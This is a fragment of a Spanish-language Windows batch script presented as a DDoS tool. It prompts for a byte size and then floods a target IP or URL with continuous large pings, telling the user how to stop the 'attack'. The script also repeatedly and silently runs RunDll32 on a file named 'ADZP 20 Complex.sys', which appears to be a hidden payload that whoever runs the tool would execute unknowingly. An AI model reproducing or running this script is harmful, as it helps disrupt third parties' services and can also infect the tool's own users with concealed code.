...
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
set /p bytes= Ingrese la Cantidad de Bites con la que Quiere Atacar la Web: 
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
echo. ===============================
...
echo. Atacando a %ip%...
echo ====================================================
echo. Para Detener Los Procesos de Ataque a la Direcion
echo. Presione Control + C y Todos los Procesos del
echo. Ataque DDOS a la URL o IP se Detendran
echo ====================================================
ping %ip% -t -l %bytes%
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
goto Inicio
